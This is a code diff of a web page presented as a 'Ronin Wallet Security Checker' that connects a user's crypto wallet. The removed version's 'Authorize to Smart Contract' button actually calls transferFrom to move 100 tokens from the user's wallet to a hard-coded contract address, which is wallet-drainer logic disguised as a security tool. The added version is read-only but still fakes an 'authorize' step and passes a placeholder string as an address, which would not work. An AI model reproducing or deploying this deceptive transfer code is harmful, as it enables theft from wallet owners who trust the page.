@@ -1,203 +1,160 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ronin Wallet Security Checker</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #121212;
-      color: white;
-      margin: 0;
-      padding: 0;
-      text-align: center;
-    }
-
-    header {
-      padding: 20px;
-      background-color: #1f1f1f;
-    }
-
-    header h1 {
-      font-size: 2em;
-      margin: 0;
-    }
-
-    .button {
-      background-color: #3d5af1;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      font-size: 1.2em;
-      cursor: pointer;
-      margin: 20px;
-    }
-
-    .button:hover {
-      background-color: #5368f0;
-    }
-
-    .content {
-      padding: 40px;
-    }
-
-    .status {
-      margin-top: 20px;
-      font-size: 1.5em;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ronin Wallet Security Checker</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #fff;
+            text-align: center;
+            padding: 50px;
+        }
+        button {
+            background-color: #1c1c1c;
+            border: 1px solid #444;
+            color: #fff;
+            padding: 15px 30px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin: 10px;
+        }
+        button:hover {
+            background-color: #444;
+        }
+    </style>
 </head>
 <body>
-  <header>
+
     <h1>Ronin Wallet Security Checker</h1>
-  </header>
 
-  <div class="content">
-    <!-- Connect Wallet Button -->
-    <button class="button" id="connectButton">Connect Wallet</button>
+    <button id="connectButton" onclick="connectWallet()">Link Wallet</button>
+    <br><br>
+    <button id="authorizeButton" onclick="authorizeContract()" disabled>Authorize Contract</button>
+    <br><br>
+    <button id="checkBalanceButton" onclick="checkBalance()" disabled>Check Balance</button>
+    <br><br>
+    <button id="checkAllowanceButton" onclick="checkAllowance()" disabled>Check Allowance</button>
 
-    <!-- Authorize Contract Button -->
-    <button class="button" id="authorizeButton" disabled>Authorize to Smart Contract</button>
+    <p id="walletAddress">No wallet connected</p>
+    <p id="balance">Balance: N/A</p>
+    <p id="allowance">Allowance: N/A</p>
 
-    <!-- Check Balance Button -->
-    <button class="button" id="checkBalanceButton" disabled>Check Balance</button>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
 
-    <!-- Check Allowance Button -->
-    <button class="button" id="checkAllowanceButton" disabled>Check Allowance</button>
+    <script>
+        let web3;
+        let userAddress;
 
-    <div class="status" id="status">
-      Please connect your wallet to proceed.
-    </div>
-  </div>
+        // Contract details
+        const contractAddress = "0x572A3a205247F867fE63637BF5183142d5Ac0d9e"; // Contract address
+        const contractABI = [
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "owner", "type": "address" },
+                    { "internalType": "address", "name": "spender", "type": "address" }
+                ],
+                "name": "allowance",
+                "outputs": [
+                    { "internalType": "uint256", "name": "", "type": "uint256" }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "account", "type": "address" }
+                ],
+                "name": "balanceOf",
+                "outputs": [
+                    { "internalType": "uint256", "name": "", "type": "uint256" }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ];
 
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.5.0/dist/ethers.umd.min.js"></script>
-  <script>
-    let provider;
-    let signer;
-    let walletAddress = null;
-    let contract;
-    
-    // Your contract address
-    const contractAddress = '0x572A3a205247F867fE63637BF5183142d5Ac0d9e';
-    
-    const abi = [
-      {
-        "inputs": [
-          { "internalType": "address", "name": "owner", "type": "address" },
-          { "internalType": "address", "name": "spender", "type": "address" }
-        ],
-        "name": "allowance",
-        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
-        "stateMutability": "view",
-        "type": "function"
-      },
-      {
-        "inputs": [
-          { "internalType": "address", "name": "account", "type": "address" }
-        ],
-        "name": "balanceOf",
-        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
-        "stateMutability": "view",
-        "type": "function"
-      },
-      {
-        "inputs": [
-          { "internalType": "address", "name": "from", "type": "address" },
-          { "internalType": "address", "name": "to", "type": "address" },
-          { "internalType": "uint256", "name": "amount", "type": "uint256" }
-        ],
-        "name": "transferFrom",
-        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      }
-    ];
+        async function connectWallet() {
+            if (window.ethereum) {
+                // Initialize Web3 with the user's wallet
+                web3 = new Web3(window.ethereum);
+                
+                try {
+                    // Request wallet connection
+                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                    userAddress = accounts[0];
 
-    // Elements
-    const connectButton = document.getElementById('connectButton');
-    const authorizeButton = document.getElementById('authorizeButton');
-    const checkBalanceButton = document.getElementById('checkBalanceButton');
-    const checkAllowanceButton = document.getElementById('checkAllowanceButton');
-    const statusDiv = document.getElementById('status');
-
-    // Connect wallet function
-    async function connectWallet() {
-      if (window.ethereum) {
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        try {
-          await provider.send("eth_requestAccounts", []);
-          signer = provider.getSigner();
-          walletAddress = await signer.getAddress();
-          contract = new ethers.Contract(contractAddress, abi, signer);
-          
-          connectButton.innerHTML = 'Wallet Connected';
-          authorizeButton.disabled = false;
-          checkBalanceButton.disabled = false;
-          checkAllowanceButton.disabled = false;
-          statusDiv.innerHTML = `Connected: ${walletAddress}`;
-        } catch (err) {
-          console.error(err);
-          statusDiv.innerHTML = 'Connection failed. Please try again.';
+                    document.getElementById("walletAddress").innerText = `Connected: ${userAddress}`;
+                    document.getElementById("authorizeButton").disabled = false; // Enable authorize button
+                    document.getElementById("checkBalanceButton").disabled = false; // Enable check balance button
+                    document.getElementById("checkAllowanceButton").disabled = false; // Enable check allowance button
+                } catch (error) {
+                    alert('User denied wallet connection');
+                }
+            } else {
+                alert("Please install MetaMask or another Web3 wallet");
+            }
         }
-      } else {
-        statusDiv.innerHTML = 'No Ethereum provider found. Install MetaMask or another wallet.';
-      }
-    }
 
-    // Authorize to smart contract function
-    async function authorizeToContract() {
-      if (walletAddress) {
-        try {
-          const tx = await contract.transferFrom(walletAddress, '0x572A3a205247F867fE63637BF5183142d5Ac0d9e', ethers.utils.parseUnits('100', 18)); // Example
-          await tx.wait();
-          statusDiv.innerHTML = 'Authorization successful!';
-        } catch (err) {
-          console.error(err);
-          statusDiv.innerHTML = 'Authorization failed.';
+        async function authorizeContract() {
+            if (userAddress && web3) {
+                const contract = new web3.eth.Contract(contractABI, contractAddress);
+
+                try {
+                    // Example function call to checkAllowance or any other contract function you need
+                    const result = await contract.methods.allowance(userAddress, "spenderAddressHere").call();
+                    console.log('Allowance:', result);
+                    document.getElementById("allowance").innerText = `Allowance: ${web3.utils.fromWei(result, 'ether')}`;
+                    alert('Allowance check complete!');
+                } catch (error) {
+                    console.error('Authorization failed:', error);
+                    alert('Authorization failed');
+                }
+            } else {
+                alert("Please connect your wallet first");
+            }
         }
-      } else {
-        statusDiv.innerHTML = 'Please connect your wallet first.';
-      }
-    }
 
-    // Check balance function
-    async function checkBalance() {
-      if (walletAddress) {
-        try {
-          const balance = await contract.balanceOf(walletAddress);
-          statusDiv.innerHTML = `Balance: ${ethers.utils.formatUnits(balance, 18)} tokens`;
-        } catch (err) {
-          console.error(err);
-          statusDiv.innerHTML = 'Failed to fetch balance.';
+        async function checkBalance() {
+            if (userAddress && web3) {
+                const contract = new web3.eth.Contract(contractABI, contractAddress);
+
+                try {
+                    // Check the balance
+                    const result = await contract.methods.balanceOf(userAddress).call();
+                    console.log('Balance:', result);
+                    document.getElementById("balance").innerText = `Balance: ${web3.utils.fromWei(result, 'ether')}`;
+                } catch (error) {
+                    console.error('Balance check failed:', error);
+                    alert('Balance check failed');
+                }
+            } else {
+                alert("Please connect your wallet first");
+            }
         }
-      } else {
-        statusDiv.innerHTML = 'Please connect your wallet first.';
-      }
-    }
 
-    // Check allowance function
-    async function checkAllowance() {
-      if (walletAddress) {
-        try {
-          const spender = '0x572A3a205247F867fE63637BF5183142d5Ac0d9e'; // Example spender address
-          const allowance = await contract.allowance(walletAddress, spender);
-          statusDiv.innerHTML = `Allowance: ${ethers.utils.formatUnits(allowance, 18)} tokens`;
-        } catch (err) {
-          console.error(err);
-          statusDiv.innerHTML = 'Failed to fetch allowance.';
+        async function checkAllowance() {
+            if (userAddress && web3) {
+                const contract = new web3.eth.Contract(contractABI, contractAddress);
+
+                try {
+                    // Check the allowance (using a different spender address)
+                    const spender = "spenderAddressHere"; // Replace with actual spender address
+                    const result = await contract.methods.allowance(userAddress, spender).call();
+                    console.log('Allowance:', result);
+                    document.getElementById("allowance").innerText = `Allowance: ${web3.utils.fromWei(result, 'ether')}`;
+                } catch (error) {
+                    console.error('Allowance check failed:', error);
+                    alert('Allowance check failed');
+                }
+            } else {
+                alert("Please connect your wallet first");
+            }
         }
-      } else {
-        statusDiv.innerHTML = 'Please connect your wallet first.';
-      }
-    }
+    </script>
 
-    // Event Listeners
-    connectButton.addEventListener('click', connectWallet);
-    authorizeButton.addEventListener('click', authorizeToContract);
-    checkBalanceButton.addEventListener('click', checkBalance);
-    checkAllowanceButton.addEventListener('click', checkAllowance);
-  </script>
 </body>
 </html>
